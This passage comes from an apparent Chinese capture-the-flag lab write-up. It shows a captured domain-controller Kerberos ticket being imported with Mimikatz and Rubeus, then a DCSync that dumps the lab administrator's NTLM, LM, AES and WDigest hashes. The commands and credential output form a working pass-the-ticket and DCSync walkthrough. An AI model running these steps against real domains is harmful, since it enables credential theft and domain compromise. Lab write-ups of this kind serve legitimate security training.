doIFlDCCBZCgAwIBBaEDAgEWooIEnDCCBJhhggSUMIIEkKADAgEFoQ4bDFhJQU9SQU5HLkxBQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMWElBT1JBTkcuTEFCo4IEVDCCBFCgAwIBEqEDAgECooIEQgSCBD5aZsYI9Sw2W6J+rVNw+77PB+2CdipSyfMJuMYJuep25IVTVTASjwKCfMgBjw0UjoQHMrTZmXdiQD5RBKogFn3zkQgqUUSTHMkjtN5/97EcrNuobYOEYByCcJDJVNVFYpF4BHvOwT1oW9tfRNK8YGcKSwSTyIITkeLbukhwym5CbYgiy//zubFVQTkR31cokGPtkuPfBt5lI27xMKhxQ1Ij59EQHGoYOIJBrO2Lvc0UCD19aVHq2Qqf/dqaYwUZ2q/YhEnby/ws/dCfZlWpPJK/pgDErh9ibcsEABDvV8Rhm833Yc8jIPf8J8DKFKFAfl80ZnxRwTLTXIKR3fpj0kFWg3pSApolh4SY3PiW7k9X9fuK+4LI8TuH5ZK47MAafUMvByyGYZwJ3Yrar0m99ia9JLn3jrX6Qk4LpK3VJppuNlN+gwMC9/mYlGyjlXCBZgZCnalbgNUlRFdvqHZBettxrYugDGGYErhKWt/XtLPW4fvA2FkscK8wm0N1/o0GcdhD/Oy2f+Symu57vNZoQvUqoKVPlbt7ccF6V9BLQoGuIr831JrMDLXGdPChV+qBRe9ErHUKFTZb4o02Q22gxltkltpprYBNprl9mS9FWWycGDO7e6wYGrYTFxFaHwUL7U+TY3OiYucHTzUWh1cauxjYchJBZqI7oOe0MW9IdJ6OkFSK1IpGlPr0WgEpG5RBN1pYvap4H/zHzpR4DvUvJezoJNEZJ8050+3PujeDGV9RRQTkMema+LGyefR3yKe88yiJ+xu+dZI4GWfj96vlQ0wphmm8/ysUMUG9OOfwS8rk98qP0SplwsuCdyvXQxGZOOA9/RPeMgV0KBJwcociO2FRykFL7GVexVJ62Wtl/UY9WqCpBTr44A9gvR92si7gNJdIdHf1AvTSD3xlHOWqYC6E/sFBU6BMjmoFDycK9wmcr1qpg/n3Zm+EnsMb5LLEL3VlK413NadraLP+/mA1CtrQQgSCoWP5uGTwzD/4e64IqgVbt0QrZdQspmd9UsiIX97vxVrTY2Ca4UObnl0LSJc2gUVnP3qSm5J4AXEQRNzI+0m40KshstoIz1dsJp/YVcze+DLeH6HbkFqlTM8hUVok5M69guHXNtsavg2xnw/rjcU2/SyH8vnd4cQgbKirAb0BYt/sIS4wtiOtrbq0vr06c1L10xwkjfe4IC8pmCG6q9RADOn8n+SfFpXBkoSMFUyfqwf4DuS83703iBPG13ushLxWpDcDCxISd2uk8BlatFwNXGDL0IOJnESLseMvwX3Csw8+9PRDLWTIHrAr5a/Np/tZAT3yvh85XE26m6hLs7cGAFXH+m8cmkSws2lTDvERTgXm3uxojoe8sJh7PPBWaM0surxjtYL1JL+6RD6oH/S/2qmw/bFSIanrVM5dwCKblSkcKUKqMg8re4iQ74MqUY6dff2RGt5zldrqk6SjgeMwgeCgAwIBAKKB2ASB1X2B0jCBz6CBzDCByTCBxqArMCmgAwIBEqEiBCAkzDKS0dyBbUs2LWRfrMMsic4a1ZchdPHkd73Kcqxn96EOGwxYSUFPUkFORy5MQUKiEjAQoAMCAQGhCTAHGwVEQzAxJKMHAwUAYKEAAKURGA8yMDI0MDcyNDAwMTUxN1qmERgPMjAyNDA3MjQxMDE1MTdapxEYDzIwMjQwNzMxMDAxNTE3WqgOGwxYSUFPUkFORy5MQUKpITAfoAMCAQKhGDAWGwZrcmJ0Z3QbDFhJQU9SQU5HLkxBQg</span><span class="token operator" style="color:#393A34">==</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">*</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> Ticket cache size: </span><span class="token number" style="color:#36acaa">1</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="17222445-xiaorangwin19-票据文件直接-dcsync">172.22.4.45 XIAORANG\WIN19 票据文件直接 DCSync<a href="#17222445-xiaorangwin19-票据文件直接-dcsync" class="hash-link" aria-label="172.22.4.45 XIAORANG\WIN19 票据文件直接 DCSync的直接链接" title="172.22.4.45 XIAORANG\WIN19 票据文件直接 DCSync的直接链接">​</a></h2>
<p>将得到的票据数据 Base64 解码后，储存为 <code>DC01.kirbi</code> 文件</p>
<p>然后使用 <code>Mimikatz</code> 进行 DCSync</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">mimikatz</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">commandline</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic"># kerberos::purge</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Ticket</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">s</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> purge </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> current session is OK</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mimikatz</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">commandline</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic"># kerberos::ptt DC01.kirbi</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">* File: </span><span class="token string" style="color:#e3116c">&#x27;DC01.kirbi&#x27;</span><span class="token builtin class-name">:</span><span class="token plain"> OK</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mimikatz</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">commandline</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic"># lsadump::dcsync /domain:xiaorang.lab /user:administrator</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">DC</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;xiaorang.lab&#x27;</span><span class="token plain"> will be the domain</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">DC</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;DC01.xiaorang.lab&#x27;</span><span class="token plain"> will be the DC server</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">DC</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;administrator&#x27;</span><span class="token plain"> will be the user account</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">rpc</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> Service  </span><span class="token builtin class-name">:</span><span class="token plain"> ldap</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">rpc</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> AuthnSvc </span><span class="token builtin class-name">:</span><span class="token plain"> GSS_NEGOTIATE </span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">9</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Object RDN           </span><span class="token builtin class-name">:</span><span class="token plain"> Administrator</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">** SAM ACCOUNT **</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">SAM Username         </span><span class="token builtin class-name">:</span><span class="token plain"> Administrator</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Account Type         </span><span class="token builtin class-name">:</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">30000000</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">USER_OBJECT</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">User Account Control </span><span class="token builtin class-name">:</span><span class="token plain"> 00000200 </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">NORMAL_ACCOUNT</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Account expiration   </span><span class="token builtin class-name">:</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1601</span><span class="token plain">/1/1 </span><span class="token number" style="color:#36acaa">8</span><span class="token plain">:00:00</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Password last change </span><span class="token builtin class-name">:</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">2024</span><span class="token plain">/7/24 </span><span class="token number" style="color:#36acaa">8</span><span class="token plain">:15:12</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Object Security ID   </span><span class="token builtin class-name">:</span><span class="token plain"> S-1-5-21-1913786442-1328635469-1954894845-500</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Object Relative ID   </span><span class="token builtin class-name">:</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">500</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Credentials:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  Hash NTLM: 4889f6553239ace1f7c47fa2c619c252</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    ntlm- </span><span class="token number" style="color:#36acaa">0</span><span class="token plain">: 4889f6553239ace1f7c47fa2c619c252</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    ntlm- </span><span class="token number" style="color:#36acaa">1</span><span class="token plain">: 4889f6553239ace1f7c47fa2c619c252</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    ntlm- </span><span class="token number" style="color:#36acaa">2</span><span class="token plain">: 4889f6553239ace1f7c47fa2c619c252</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    ntlm- </span><span class="token number" style="color:#36acaa">3</span><span class="token plain">: 4889f6553239ace1f7c47fa2c619c252</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    lm  - </span><span class="token number" style="color:#36acaa">0</span><span class="token plain">: 813da4984a1e3939a735df91221e943b</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    lm  - </span><span class="token number" style="color:#36acaa">1</span><span class="token plain">: 5991588b4cc2724a4a3d17b161ad272f</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    lm  - </span><span class="token number" style="color:#36acaa">2</span><span class="token plain">: 61960a24667b36658ce18243e11a53af</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Supplemental Credentials:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">* Primary:NTLM-Strong-NTOWF *</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Random Value </span><span class="token builtin class-name">:</span><span class="token plain"> 23500bf302b53fbd2bd18700afa9046e</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">* Primary:Kerberos-Newer-Keys *</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Default Salt </span><span class="token builtin class-name">:</span><span class="token plain"> XIAORANG.LABAdministrator</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Default Iterations </span><span class="token builtin class-name">:</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">4096</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Credentials</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      aes256_hmac       </span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">4096</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token builtin class-name">:</span><span class="token plain"> 23b87fd9c4a80c58fb0d71e2a0d5fc82b7de27156d039ad791093aa88ca95eb3</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      aes128_hmac       </span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">4096</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token builtin class-name">:</span><span class="token plain"> 3a4807b53f305c84603ff072655a5c42</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      des_cbc_md5       </span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">4096</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token builtin class-name">:</span><span class="token plain"> 64feb058753bf1a2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    OldCredentials</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      aes256_hmac       </span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">4096</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token builtin class-name">:</span><span class="token plain"> 23b87fd9c4a80c58fb0d71e2a0d5fc82b7de27156d039ad791093aa88ca95eb3</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      aes128_hmac       </span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">4096</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token builtin class-name">:</span><span class="token plain"> 3a4807b53f305c84603ff072655a5c42</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      des_cbc_md5       </span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">4096</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token builtin class-name">:</span><span class="token plain"> 64feb058753bf1a2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    OlderCredentials</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      aes256_hmac       </span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">4096</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token builtin class-name">:</span><span class="token plain"> 23b87fd9c4a80c58fb0d71e2a0d5fc82b7de27156d039ad791093aa88ca95eb3</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      aes128_hmac       </span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">4096</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token builtin class-name">:</span><span class="token plain"> 3a4807b53f305c84603ff072655a5c42</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      des_cbc_md5       </span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">4096</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token builtin class-name">:</span><span class="token plain"> 64feb058753bf1a2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">* Primary:Kerberos *</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Default Salt </span><span class="token builtin class-name">:</span><span class="token plain"> XIAORANG.LABAdministrator</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Credentials</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      des_cbc_md5       </span><span class="token builtin class-name">:</span><span class="token plain"> 64feb058753bf1a2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    OldCredentials</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      des_cbc_md5       </span><span class="token builtin class-name">:</span><span class="token plain"> 64feb058753bf1a2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">* Packages *</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    NTLM-Strong-NTOWF</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">* Primary:WDigest *</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    01  1fd4772b6f3fea5f0a5a234dde150efb</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    02  70b5ab2d5931d45749e4f10b80a70466</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    03  0d71e6115a7e5850b3e4c777aba623df</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    04  1fd4772b6f3fea5f0a5a234dde150efb</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    05  354a5ce3ca3629c6ca77a73b462c0a7f</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    06  a692fc773761b7edf3a3cad332053a85</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    07  3b3bf4f20b86e7f890d2a6f748684c86</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    08  511be1f8053c22c147fe774e84f6cfa0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    09  5cd37846466bba0ab01d0a4fb8fd421a</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token number" style="color:#36acaa">10</span><span class="token plain">  5c90774e68ba65b15563d817ea03be1d</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token number" style="color:#36acaa">11</span><span class="token plain">  1aa618d4990ce0b031f56c35b00ef135</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token number" style="color:#36acaa">12</span><span class="token plain">  511be1f8053c22c147fe774e84f6cfa0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token number" style="color:#36acaa">13</span><span class="token plain">  385ea61fafea315b384cff461b9e114c</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token number" style="color:#36acaa">14</span><span class="token plain">  ee5a115e84919b46e718c6c4294dba78</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token number" style="color:#36acaa">15</span><span class="token plain">  729b4c3a8edab7f12e037ec161293f44</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token number" style="color:#36acaa">16</span><span class="token plain">  e3ff26cc0629c51fc68f18ce47173f45</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token number" style="color:#36acaa">17</span><span class="token plain">  bd6d0bafad3f99c28a9a18d9e5351763</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token number" style="color:#36acaa">18</span><span class="token plain">  359507105fa376c918a80f7fb982446a</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token number" style="color:#36acaa">19</span><span class="token plain">  20ad44fe17377c5f3815358c33ca7c34</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token number" style="color:#36acaa">20</span><span class="token plain">  330fb8b3848b024ba40a8cef987d6795</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token number" style="color:#36acaa">21</span><span class="token plain">  ec544c990f343fe338a4667f3791e5ab</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token number" style="color:#36acaa">22</span><span class="token plain">  d528c47b4f30acdeb5bf49f49fed7d64</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token number" style="color:#36acaa">23</span><span class="token plain">  41bb0903f6c2129f27bfa06e6d9b186b</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token number" style="color:#36acaa">24</span><span class="token plain">  b5c4fc8c656c14829c0da25e0852582a</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token number" style="color:#36acaa">25</span><span class="token plain">  8bba781aff9bb5e7939f73c216d0e750</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token number" style="color:#36acaa">26</span><span class="token plain">  d3bb8972f7c7ffbc5b22392125c4e21f</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token number" style="color:#36acaa">27</span><span class="token plain">  dd97e0d53b5d1ae346029810cf74d0b8</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token number" style="color:#36acaa">28</span><span class="token plain">  0c084ded5672573ee7c4127ab474f930</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token number" style="color:#36acaa">29</span><span class="token plain">  c922d791de366eedeb97c1bd0798d6ff</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="17222445-xiaorangwin19-导入票据直接-dcsync-获取域内哈希">172.22.4.45 XIAORANG\WIN19 导入票据直接 DCSync 获取域内哈希<a href="#17222445-xiaorangwin19-导入票据直接-dcsync-获取域内哈希" class="hash-link" aria-label="172.22.4.45 XIAORANG\WIN19 导入票据直接 DCSync 获取域内哈希的直接链接" title="172.22.4.45 XIAORANG\WIN19 导入票据直接 DCSync 获取域内哈希的直接链接">​</a></h2>
<p>使用 <code>Rubeus</code> 导入票据</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">PS C:</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Users</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">randark</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Desktop</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> .</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Rubeus.exe ptt /ticket:doIFlDCCBZCgAwIBBaEDAgEWooIEnDCCBJhhggSUMIIEkKADAgEFoQ4bDFhJQU9SQU5HLkxBQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMWElBT1JBTkcuTEFCo4IEVDCCBFCgAwIBEqEDAgECooIEQgSCBD5aZsYI9Sw2W6J+rVNw+77PB+2CdipSyfMJuMYJuep25IVTVTASjwKCfMgBjw0UjoQHMrTZmXdiQD5RBKogFn3zkQgqUUSTHMkjtN5/97EcrNuobYOEYByCcJDJVNVFYpF4BHvOwT1oW9tfRNK8YGcKSwSTyIITkeLbukhwym5CbYgiy//zubFVQTkR31cokGPtkuPfBt5lI27xMKhxQ1Ij59EQHGoYOIJBrO2Lvc0UCD19aVHq2Qqf/dqaYwUZ2q/YhEnby/ws/dCfZlWpPJK/pgDErh9ibcsEABDvV8Rhm833Yc8jIPf8J8DKFKFAfl80ZnxRwTLTXIKR3fpj0kFWg3pSApolh4SY3PiW7k9X9fuK+4LI8TuH5ZK47MAafUMvByyGYZwJ3Yrar0m99ia9JLn3jrX6Qk4LpK3VJppuNlN+gwMC9/mYlGyjlXCBZgZCnalbgNUlRFdvqHZBettxrYugDGGYErhKWt/XtLPW4fvA2FkscK8wm0N1/o0GcdhD/Oy2f+Symu57vNZoQvUqoKVPlbt7ccF6V9BLQoGuIr831JrMDLXGdPChV+qBRe9ErHUKFTZb4o02Q22gxltkltpprYBNprl9mS9FWWycGDO7e6wYGrYTFxFaHwUL7U+TY3OiYucHTzUWh1cauxjYchJBZqI7oOe0MW9IdJ6OkFSK1IpGlPr0WgEpG5RBN1pYvap4H/zHzpR4DvUvJezoJNEZJ8050+3PujeDGV9RRQTkMema+LGyefR3yKe88yiJ+xu+dZI4GWfj96vlQ0wphmm8/ysUMUG9OOfwS8rk98qP0SplwsuCdyvXQxGZOOA9/RPeMgV0KBJwcociO2FRykFL7GVexVJ62Wtl/UY9WqCpBTr44A9gvR92si7gNJdIdHf1AvTSD3xlHOWqYC6E/sFBU6BMjmoFDycK9wmcr1qpg/n3Zm+EnsMb5LLEL3VlK413NadraLP+/mA1CtrQQgSCoWP5uGTwzD/4e64IqgVbt0QrZdQspmd9UsiIX97vxVrTY2Ca4UObnl0LSJc2gUVnP3qSm5J4AXEQRNzI+0m40KshstoIz1dsJp/YVcze+DLeH6HbkFqlTM8hUVok5M69guHXNtsavg2xnw/rjcU2/SyH8vnd4cQgbKirAb0BYt/sIS4wtiOtrbq0vr06c1L10xwkjfe4IC8pmCG6q9RADOn8n+SfFpXBkoSMFUyfqwf4DuS83703iBPG13ushLxWpDcDCxISd2uk8BlatFwNXGDL0IOJnESLseMvwX3Csw8+9PRDLWTIHrAr5a/Np/tZAT3yvh85XE26m6hLs7cGAFXH+m8cmkSws2lTDvERTgXm3uxojoe8sJh7PPBWaM0surxjtYL1JL+6RD6oH/S/2qmw/bFSIanrVM5dwCKblSkcKUKqMg8re4iQ74MqUY6dff2RGt5zldrqk6SjgeMwgeCgAwIBAKKB2ASB1X2B0jCBz6CBzDCByTCBxqArMCmgAwIBEqEiBCAkzDKS0dyBbUs2LWRfrMMsic4a1ZchdPHkd73Kcqxn96EOGwxYSUFPUkFORy5MQUKiEjAQoAMCAQGhCTAHGwVEQzAxJKMHAwUAYKEAAKURGA8yMDI0MDcyNDAwMTUxN1qmERgPMjAyNDA3MjQxMDE1MTdapxEYDzIwMjQwNzMxMDAxNTE3WqgOGwxYSUFPUkFORy5MQUKpITAfoAMCAQKhGDAWGwZrcmJ0Z3QbDFhJQU9SQU5HLkxBQg</span><span class="token operator" style="color:#393A34">==</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   ______        _</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">_____ </span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">      </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   _____</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">_   _</span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">|</span><span class="token plain">__  _____ _   _  ___</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token operator" style="color:#393A34">|</span><span class="token plain">  __  /</span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">|</span><span class="token plain">  _ </span><span class="token punctuation" style="color:#393A34">\</span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> ___ </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">|</span><span class="token plain">/___</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">|</span><span class="token plain">  </span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">\</span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">|</span><span class="token plain">_</span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span 